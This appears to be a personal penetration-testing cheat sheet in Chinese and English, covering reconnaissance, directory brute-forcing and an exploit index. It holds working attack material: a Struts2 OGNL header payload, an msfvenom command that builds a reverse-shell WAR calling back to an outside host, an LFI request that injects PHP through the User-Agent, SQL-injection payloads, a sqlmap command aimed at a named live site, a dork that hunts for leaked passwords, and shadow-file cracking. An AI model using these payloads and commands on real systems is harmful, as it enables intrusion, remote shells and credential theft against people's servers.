Real World HTF：

1.get all subsite in sublist3r \ shodan \ google dorks \ GISL \ Maltego \ censys \ virtual host scanner

1.1 GOOGLE Dorks
site:target.com -www
site:target.com intitle:”test” -support
site:target.com ext:php | ext:html
site:subdomain.target.com
site:target.com inurl:auth
site:target.com inurl:dev


site:Github.com User ID='sa';Password

ruby scan.rb --ip=192.168.1.101 --host=domain.tld
1.2 sublist3r + IPPorxy

1.3 domain无用时，使用https://censys.io/ipv4?q=103.37.152.58/24直接获取相应网段

1.4 GSIL、GitHunter
RT
1.5 
Wappaylzer (useful in profiling front page)

2.detail target:
2.0 normal directories in dirb(默认设置不用指定字典） \ gobuster \ dirsearch \ nikto \ Cansina \ Dirsearch \ Fuzzdb
首先获取代理ip，否则暴目录很容易被banned，https://github.com/qiyeboy/IPProxyPool


其次是字典，中国站点可能需要随机字符产生，否则容易遗漏大量地址
gobuster -u http://o14.ycpi.ne1.yahoo.com/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
*
对于tomcat：
https://github.com/danielmiessler/SecLists/blob/c196a6e62d0b63d6be0c84e6fa224352ea5949df/Discovery/Web-Content/ApacheTomcat.fuzz.txt
对于git：
Discovery/Web-Content/quickhits.txt
对于wp：
root@lance:~/Desktop/git/SecLists# gobuster -u https://xxxx.top -p http://221.7.255.168:8080 -w /root/Desktop/git/SecLists/Discovery/Web-Content/URLs/urls-wordpress-3.3.1.txt //926行
fuzzdb/discovery/predictable-filepaths/cms/wordpress.txt //1500+

//wp-includes/theme-compat/footer.php (Status: 200)
//wp-includes/theme-compat/comments.php (Status: 200)
//wp-includes/theme-compat/sidebar.php (Status: 200)
//wp-includes/theme-compat/header.php (Status: 200)
//wp-includes/update.php (Status: 200)
//wp-includes/theme.php (Status: 200)
//wp-includes/user.php (Status: 200)
//wp-includes/vars.php (Status: 200)
//wp-includes/version.php (Status: 200)
//wp-includes/widgets.php (Status: 200)
//wp-includes/wlwmanifest.xml (Status: 200)
//wp-includes/wp-db.php (Status: 200)
//wp-load.php (Status: 200)
//wp-login.php (Status: 200)
//wp-includes/wp-diff.php (Status: 200)
//wp-settings.php (Status: 200)
//wp-signup.php (Status: 302)
//wp-mail.php (Status: 403)
//wp-links-opml.php (Status: 200)
=====================================================
2018/09/12 15:22:47 Finished
=====================================================


2.3 不使用字典
nikto -host http://xxx.sss.com/cms/ -Display 
15:26:11 2018 - 404 for GET:       /cms/yt/
V:Thu Sep 27 15:26:11 2018 - 404 for GET:       /cms/mx/
V:Thu Sep 27 15:26:11 2018 - 404 for GET:       /cms/fm/
V:Thu Sep 27 15:26:11 2018 - 404 for GET:       /cms/md/
V:Thu Sep 27 15:26:11 2018 - 404 for GET:       /cms/mc/
V:Thu Sep 27 15:26:11 2018 - 404 for GET:       /cms/mn/
V:Thu Sep 27 15:26:11 2018 - 404 for GET:       /cms/me/
V:Thu Sep 27 15:26:11 2018 - 404 for GET:       /cms/ms/
V:Thu Sep 27 15:26:11 2018 - 404 for GET:       

查看AWS s3服务器 slurp
root@HQ:/usr/bin/slurp# ./slurp domain -t sankuai.com
./slurp keyword -t sankuai.com log

2.4 github
gitdumper http://domain.com/someDir/.git clone



3. Exploit - Index
3.1  struts2 .action .do .go

Content-Type: %{#context[‘com.opensymphony.xwork2.dispatcher.HttpServletResponse’].addHeader(‘X-Ack-Th3g3nt3lman-POC’,4*4)}.multipart/form-data

relative-url-extractor
https://github.com/jobertabma/relative-url-extractor
ruby extract.rb demo-file.js
ruby extract.rb https://hackerone.com/some-file.js
ruby extract.rb '|cat demo-file.js' -c
3.2 msf tomcat scanner auxiliary/scanner/http/tomcat_mgr_login

3.2.1 scan default admin:password


3.2.2 generating .war reverse shell

msfvenom -p java/jsp_shell_reverse_tcp LHOST=18.191.1**.* LPORT=4444 -f war > shell.war

bash shell 批量扫

for  line  in  `cat filename`
do
echo ${line}
done

3.3 LFI
参考https://medium.com/bugbountywriteup/cvv-1-local-file-inclusion-ebc48e0e479a
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>

3.4 SQLi
1.order by
https://www.cnblogs.com/REscan/p/6884278.html
http://www.freebuf.com/column/145988.html
?evil=and(updatexml(1,concat(0x7e,(select user())),0))		
c:\python27\python.exe sqlmap.py -u "https://paweixin.zhulv.club/index.php/padgadmin/Houtai/EditQa/wtid/101*" -D sakila -T customer_list --columns --batch


3.5 XXE
3.6 Deserialization
3.6.1 Java Deserialization
3.6.2 Nodejs / Python / PHP Deserialization

Understanding PHP Object Injection
Java Deserialization Cheat Sheet
Rails Remote Code Execution Vulnerability Explained
Arbitrary code execution with Python pickles
Nodejs参考


https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/

https://medium.com/bugbountywriteup/hackthebox-celestial-writeup-dc202c3f1ec




3.7 Logic Testing Case

https://medium.com/bugbountywriteup/exploiting-an-unknown-vulnerability-a752272ffd7f

假设遇到
Consultant set fee in coins for their service.
# consultant request
POST /set/fee/
{"value": 5, "timing":2}
Clients visits consultant’s timeline, select an appropriate time slot and book that timing, coins get deducted from client’s account according to fee shown in timeline respective to time slot.
# client request
POST /consultant_username/book
{"timing":2}


则至少有以下测试点

Injection vulnerability like Sqli, Command injection
Modify content type and request data to xml for testing XML injection
Booking consultant’s higher value time slots in less coin
Injecting “value” parameter from consultant request and using it in client request
Parameter pollution by injection two timing values in client request
Array based injection using timing value in client request i.e {“timing[0]”:2}
HTTP method tampering by changing POST to PUT
Booking for two or more time slots of same consultant by playing multi-threaded client request (Race condition)
Booking two different consultant’s time slots by playing multi-threaded client request (Race condition)


3.8 Local Enumeration 

john shadow.backup --wordlist=/usr/share/wordlists/rockyou.txt 其中shadow.backup是hash文件
sudo -l 查看允许使用sudo的命令













==========================

App

apk downloader
https://apps.evozi.com/apk-downloader/?id=com.shipt.groceries
